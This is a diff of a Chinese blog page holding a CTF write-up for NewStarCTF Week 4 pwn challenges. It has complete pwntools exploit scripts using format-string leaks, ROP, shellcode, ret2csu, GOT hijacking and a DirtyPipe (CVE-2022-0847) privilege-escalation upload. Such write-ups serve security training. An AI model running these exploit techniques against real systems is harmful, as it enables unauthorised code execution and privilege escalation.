@@ -1,248 +1,278 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>NewStarCTF Week4 PWN WP | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            NewStarCTF Week4 PWN WP
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2022-10-17
+        <div class="post-title">
+            
+            
+                NewStarCTF Week4 PWN WP
+            
+            
         </div>
-        <div class="post-md">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+        <span class="post-date">
+            10月 17, 2022
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
 <p>由于知道这个比赛比较晚，正式参与比赛是第四周的周三晚上，还差一道堆🐎，没有完成AK(但是拿了四个一血也好爽)。最后一题未解主要原因确实是自己在_IO_File相关利用了解不足，赛后找夜悠师傅拿到了exp，真的好感谢🌹</p>
 </blockquote>
 <p><img src="/img/article/newstarctf/image-20221017112826465.png" alt="战绩截图"></p>
 <h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>比较简单的一道题，等我开始做题的时候已经有4个解了</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,26078)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Now answer me, will you v me 50&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;%11$p%9$p&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x840</span> </span><br><span class="line">success(<span class="string">&quot;canary --&gt;&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">success(<span class="string">&quot;code_base--&gt;&quot;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">money = code_base + <span class="number">0x20206c</span></span><br><span class="line">payload =  <span class="string">b&#x27;%99c%7$n&#x27;</span> + p64(money)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;What do you want to say to the canary&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">binsh = code_base + <span class="number">0x202020</span></span><br><span class="line">pop_rdi = code_base+<span class="number">0x0000000000000b33</span> <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">syscall = code_base + <span class="number">0x9dc</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(syscall)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-io = process(&#39;./pwn&#39;)
-# io = remote(&#39;node4.buuoj.cn&#39;,26078)
-context.log_level = &#39;debug&#39;
-# pause()
-io.recvuntil(&#39;Now answer me, will you v me 50&#39;)
-io.sendline(&#39;%11$p%9$p&#39;)
-io.recvline()
-canary = int(io.recv(18),16)
-code_base = int(io.recv(14),16) - 0x840 
-success(&quot;canary --&gt;&quot;+hex(canary))
-success(&quot;code_base--&gt;&quot;+hex(code_base))
 
-money = code_base + 0x20206c
-payload =  b&#39;%99c%7$n&#39; + p64(money)
-pause()
-io.recvuntil(&#39;What do you want to say to the canary&#39;)
-io.sendline(payload)
-io.recvline()
-binsh = code_base + 0x202020
-pop_rdi = code_base+0x0000000000000b33 #: pop rdi ; ret
-syscall = code_base + 0x9dc
-payload = b&#39;a&#39;*0x28 + p64(canary) + b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(binsh) + p64(syscall)
-io.sendline(payload)
 
-io.interactive()
-</code></pre>
 <h2 id="OhMyShellcode"><a href="#OhMyShellcode" class="headerlink" title="OhMyShellcode"></a>OhMyShellcode</h2><p>一道orw的shellcode题目，题目专门开了一个空间用于放置orw，也比较简单。关键在于第一次读入有个判断，会拦住<code>\x0f</code>，但是检测长度并不完全。</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
-# io = process(&#39;./pwn&#39;)
-io = remote(&#39;node4.buuoj.cn&#39;,25430)
-context.arch = &#39;amd64&#39;
-# context.log_level = &#39;debug&#39;
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25430</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x233000</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Show me your magic.&#x27;</span>)</span><br><span class="line">read = <span class="string">&#x27;&#x27;&#x27;mov rsi,0x23301e</span></span><br><span class="line"><span class="string">mov rax , 0</span></span><br><span class="line"><span class="string">mov rax , 0</span></span><br><span class="line"><span class="string">mov rax , 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sh = asm(read)</span><br><span class="line">sh2 =asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">sh2+=asm(shellcraft.read(<span class="number">3</span>,backdoor+<span class="number">0x100</span>,<span class="number">0x100</span>))</span><br><span class="line">sh2+=asm(shellcraft.write(<span class="number">1</span>,backdoor+<span class="number">0x100</span>,<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(sh)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Good luck!&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendline(sh2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-backdoor = 0x233000
 
-io.recvuntil(&#39;Show me your magic.&#39;)
-read = &#39;&#39;&#39;mov rsi,0x23301e
-mov rax , 0
-mov rax , 0
-mov rax , 0
-syscall
-&#39;&#39;&#39;
-sh = asm(read)
-sh2 =asm(shellcraft.open(&#39;./flag&#39;))
-sh2+=asm(shellcraft.read(3,backdoor+0x100,0x100))
-sh2+=asm(shellcraft.write(1,backdoor+0x100,0x100))
 
-io.send(sh)
-pause()
-io.recvuntil(&#39;Good luck!&#39;)
-payload = b&#39;a&#39;*0x38 + p64(backdoor)
-io.sendline(payload)
-raw_input()
-io.sendline(sh2)
-io.interactive()
-</code></pre>
 <h2 id="ret2csu2"><a href="#ret2csu2" class="headerlink" title="ret2csu2"></a>ret2csu2</h2><p>做这道题的时候并没有去看第三周的ret2csu，夜悠师傅的评价是这样的，不得不说这个题的gadget还是很漂亮的。</p>
 <p><img src="/img/article/newstarctf/image-20221017121338219.png" alt="会玩就行"></p>
 <p>第一次payload要改rbp到bss段，同时跳转回<code>sys_read</code>，实现对bss写入<code>ret2csu</code>的rop调用<code>mprotect</code>，以及shellcode布置。</p>
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29895</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">csu_end_addr = <span class="number">0x40075a</span></span><br><span class="line">csu_front_addr = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x40067b</span></span><br><span class="line">mprotect_plt = <span class="number">0x600fe8</span></span><br><span class="line">bss = <span class="number">0x601110</span></span><br><span class="line">bss1 = <span class="number">0x601020</span></span><br><span class="line">leave_ret =<span class="number">0x400681</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sc = asm(shellcraft.sh())</span><br><span class="line">    payload +=sc</span><br><span class="line">    payload += <span class="string">b&#x27;b&#x27;</span> *<span class="number">0x40</span></span><br><span class="line">    payload += p64(bss1-<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(leave_ret)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment"># sleep(1)</span></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;check it!&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(bss)+p64(<span class="number">0x4006e7</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,mprotect_plt,<span class="number">0x601000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>,<span class="number">0x6010a0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()ma</span><br></pre></td></tr></table></figure>
 
-# io = process(&#39;./pwn&#39;)
-io = remote(&#39;node4.buuoj.cn&#39;,29895)
-context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
-csu_end_addr = 0x40075a
-csu_front_addr = 0x400740
 
-mprotect = 0x40067b
-mprotect_plt = 0x600fe8
-bss = 0x601110
-bss1 = 0x601020
-leave_ret =0x400681
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += b&#39;a&#39; * 0x38
-    payload += p64(last)
-    sc = asm(shellcraft.sh())
-    payload +=sc
-    payload += b&#39;b&#39; *0x40
-    payload += p64(bss1-0x8)
-    payload += p64(leave_ret)
-    io.send(payload)
-    # sleep(1)
-pause()
-io.recvuntil(&#39;check it!&#39;)
-payload = b&#39;a&#39;*0xf0+p64(bss)+p64(0x4006e7)
-io.send(payload)
-sleep(1)
 
-csu(0,1,mprotect_plt,0x601000,0x1000,0x7,0x6010a0)
-
-io.interactive()ma
-</code></pre>
 <h2 id="这是堆🐴"><a href="#这是堆🐴" class="headerlink" title="这是堆🐴"></a>这是堆🐴</h2><p>这道题由于heap角标检测可以为负，利用一个指向自己的指针实现任意地址写，随后劫持got为one_gadget即可</p>
-<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28432</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">heap = <span class="number">0x6020e0</span></span><br><span class="line">puts = <span class="number">0x602018</span> <span class="comment">#-25</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    io.sendline(text)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">12</span>,p64(<span class="number">0x602038</span>))    </span><br><span class="line">show(-<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recvunti(&#x27;Content:&#x27;)</span></span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">pause()</span><br><span class="line">success(<span class="string">&quot;puts_addr--&gt;&quot;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line">success(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">edit(-<span class="number">12</span>,p64(one_gadget))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-# io = process(&#39;./pwn&#39;)
-io = remote(&#39;node4.buuoj.cn&#39;,28432)
-# context.log_level = &#39;debug&#39;
 
-libc = ELF(&#39;./libc-2.31.so&#39;)
-heap = 0x6020e0
-puts = 0x602018 #-25
 
-def show(idx):
-    io.recvuntil(&quot;&gt;&gt;&quot;)
-    io.sendline(&#39;4&#39;)
-    io.recvuntil(&#39;Index:&#39;)
-    io.sendline(str(idx))
-    
-def edit(idx,text):
-    io.recvuntil(&quot;&gt;&gt;&quot;)
-    io.sendline(&#39;3&#39;)
-    io.recvuntil(&#39;Index:&#39;)
-    io.sendline(str(idx))
-    io.recvuntil(&#39;Content:&#39;)
-    io.sendline(text)
-
-edit(-12,p64(0x602038))    
-show(-12)
-
-# io.recvunti(&#39;Content:&#39;)
-puts = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))
-libc_base = puts - libc.symbols[&#39;printf&#39;]
-pause()
-success(&quot;puts_addr--&gt;&quot;+hex(puts))
-success(&quot;libc_base--&gt;&quot;+hex(libc_base))
-
-one_gadget = libc_base + 0xe3b01
-edit(-12,p64(one_gadget))
-io.interactive()
-</code></pre>
 <h2 id="KMario"><a href="#KMario" class="headerlink" title="KMario"></a>KMario</h2><p>一道kernel题目，利用CVE-2022-0847实现本地提权。关键在于远端没有gcc，所以只能本地编译好。先把elf转为base64，随后在远端转回elf文件即可。</p>
 <blockquote>
 <p>POC链接：<a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">CVE-2022-0847-DirtyPipe-Exploits</a></p>
 <p>不过我自己做的时候似乎由于elf文件太大，一直传不上去，看了夜悠师傅的exp才发现压缩一下就好，我真是个铸币</p>
 </blockquote>
-<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python"># -*- coding: utf-8 -*-
-from pwn import *
-import os
-
-context.log_level = &#39;debug&#39;
-cmd = &#39;$ &#39;
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">r</span>):</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;stty -echo&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip -c ./exp2 &gt; ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cd /tmp&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)</span><br><span class="line">    r.sendline((read(<span class="string">&#x27;./exp.gz&#x27;</span>)).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;gunzip ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;chmod +x ./exp&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;./exp /pwnmeplz&#x27;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25457</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./start.sh&#x27;)</span></span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>
 
 
-def exploit(r):
-    r.sendlineafter(cmd, &#39;stty -echo&#39;)
-    os.system(&#39;gzip -c ./exp2 &gt; ./exp.gz&#39;)
-    r.sendlineafter(cmd, &#39;cd /tmp&#39;)
-    r.sendlineafter(cmd, &#39;cat &lt;&lt;EOF &gt; exp.gz.b64&#39;)
-    r.sendline((read(&#39;./exp.gz&#39;)).encode(&#39;base64&#39;))
-    r.sendline(&#39;EOF&#39;)
-    r.sendlineafter(cmd, &#39;base64 -d exp.gz.b64 &gt; exp.gz&#39;)
-    r.sendlineafter(cmd, &#39;gunzip ./exp.gz&#39;)
-    r.sendlineafter(cmd, &#39;chmod +x ./exp&#39;)
-    r.sendlineafter(cmd, &#39;./exp /pwnmeplz&#39;)
-    r.interactive()
+</div> 
 
-
-p = remote(&#39;node4.buuoj.cn&#39;,25457)
-# p = process(&#39;./start.sh&#39;)
-exploit(p)
-</code></pre>
-
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/">Prev</a>
+                </div>
+            
         </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
 
+    
+      <div class="post-comment">
+
+     
+
+     
+    
     
 
 </div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
 </div>
 
+    </div>
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
